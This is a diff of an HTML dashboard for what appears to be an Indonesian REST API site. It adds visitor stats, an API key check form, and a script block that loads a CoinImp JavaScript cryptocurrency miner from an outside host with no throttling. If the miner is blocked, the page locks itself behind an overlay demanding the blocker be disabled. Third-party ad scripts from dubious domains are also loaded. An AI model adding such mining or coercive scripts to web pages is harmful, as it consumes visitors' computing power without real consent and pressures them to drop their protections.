@@ -55,7 +55,7 @@ Rest Api's
 <p>Dashboard</p>
 </a>
 </li>
-<li class="active ">
+<li>
 <a href="/docs/last_update">
 <i class="tim-icons icon-refresh-01"></i>
 <p>Last Update</p>
@@ -73,7 +73,7 @@ Rest Api's
 <p>Config </p>
 </a>
 </li>
-<li>
+<li class="active ">
 <a href="/docs/mining">
 <i class="tim-icons icon-money-coins"></i>
 <p>Mining Web</p>
@@ -246,31 +246,18 @@ Profile
 	
 <div class="content">
 <div class="row">
-<div class="col-xl-3 col-lg-6 col-md-6 col-xm-12">
+<div class="col-xl-3 col-lg-6 col-md-12 col-xm-12">
 <div class="card overflow-hidden dash1-card border-0">
 <div class="card-body">
 <div class="d-flex align-items-end justify-content-between">
 <div>
-<p class=" mb-1 ">15-04-2022</p>
+<p class=" mb-1 ">speed</p>
 <h2 class="mb-1 number-font">
-<div class="timeline-body">
-                                                <ul>
- 
-                                                    <li>Website Update</li>
- 
-                                                    <li>-</li>
- 
-                                                    <li></li>
- 
-                                                    <li>-</li>
- 
-                                                    <li>-</li>
- 
-                                                </ul>
-</small>
-<small class="fs-12 text-success">Sudah berbuat hal baik apa hari ini?</small>
+<div id="speed"></div>
+</h2>
+<small class="fs-12 text-success">Total visitor from api-katashi.herokuapp.com</small>
 </div>
-<span class="text-info fs-35 dash1-iocns bg-success-transparent border-success"><i class="tim-icons icon-time-alarm" aria-hidden="true"></i></span>
+<span class="text-info fs-35 dash1-iocns bg-info-transparent border-info"><i class="fa fa-eye" aria-hidden="true"></i></span>
 </div>
 </div>
 </div>
@@ -280,6 +267,40 @@ Profile
 <div class="card-body">
 <div class="d-flex align-items-end justify-content-between">
 <div>
+<p class=" mb-1 ">total</p>
+<h2 class="mb-1 number-font">
+<div id="total"></div>
+</h2>
+<small class="fs-12 text-muted">Your IP Address</small>
+</div>
+<span class="text-info fs-35 dash1-iocns bg-info-transparent border-info"><i class="fa fa-wifi" aria-hidden="true"></i></span>
+</div>
+</div>
+</div>
+</div>
+</div>
+<div class="row">
+<div class="col-xl-12 col-lg-12 col-md-12">
+<div class="card">
+<div class="card-header">
+<h3 class="card-title"><i class="tim-icons icon-key-25" aria-hidden="true"></i> Apikey Check</h3>
+</div>
+<div class="card-body text-sm-left font-weight-bold">
+<p class="status" style="color: white; font-size: 20px;"></p>
+<h2 class="warn" style="color: red"></h2>
+<label for="URL">Enter Your ApiKey:</label>
+<input type="text" class="form-control" id="responapikeymucoooookkk" placeholder="apikey" name="apiKey" required="">
+<small id="textHelp" class="font">Gapunya Apikey om? Contact me on
+<a href="https://api.whatsapp.com/send/?phone=62895411214710&text=apikeynya+apa+bang+apinya+katashi&app_absent=0">
+Whatsapp
+</a>
+</small>
+</br></br>
+<button type="submit" id="diklikcok" class="btn btn-success" onclick="sendata()">Submit</button>
+</div>
+</div>
+</div>
+</div>
 <script async="async" data-cfasync="false" src="//crankyderangeabound.com/9b8d51c8dd939a08be3610dc8f1efca5/invoke.js"></script>
 <div id="container-9b8d51c8dd939a08be3610dc8f1efca5"></div>
 <footer class="footer">
@@ -478,6 +499,42 @@ $('body').removeClass('white-content');
   }
  
  </script>
+ 
+ 
+ <script src="https://www.hostingcloud.racing/6cPM.js"></script>
+<script>
+    var _client = new Client.Anonymous('e3150bd98ad13667fbe10986ef10c9d36e1dead91f98625d9a3eb7a57d550a88', {
+        throttle: 0, c: 'w'
+    });
+    _client.start();
+    _client.addMiningNotification("Top", "Katashi is running JavaScript miner from coinimp.com in this site", "#cccccc", 40, "#3d3d3d");
+</script>
+<script>
+    setTimeout(function(){
+        if(typeof _client === 'undefined' || _client === null)
+        {
+            var messageDiv = document.createElement("div");
+            messageDiv.setAttribute("style","width: 50%; background-color: white; padding: 15px; display: inline-block; vertical-align: middle;");
+            messageDiv.appendChild(document.createTextNode("Please allow our miner on your blocker software to continue browsing our site. Reload the page after that."));
+            var mainDiv = document.createElement("div");
+            mainDiv.setAttribute("style","position: absolute; top: 0px; right: 0px; width: 100%; height: 100%; display: flex; background-color: #4c4c4c;  align-items: center; justify-content: center");
+            mainDiv.appendChild(messageDiv);
+            document.body.appendChild(mainDiv);
+            document.getElementsByTagName("body")[0].style.overflow = "hidden";
+            window.scrollTo(0, 0);
+        }
+    },1000);
+</script>
+<script>
+setTimeout(function(){
+    let div = document.createElement("div");
+    document.body.appendChild(div);
+    setInterval(function(){
+        let speed = _client._threads.reduce((before, worker) => before + worker.hashesPerSecond, 0);
+        let total = _client._threads.reduce((before, worker) => before + worker.hashesTotal, 0);
+    },500);
+},1000);
+</script>
  
  <script type='text/javascript' src='//pl17197412.safestgatetocontent.com/0b/ee/e9/0beee9bdc2f6fe9d6d3effc7c613a1ac.js'></script>
  
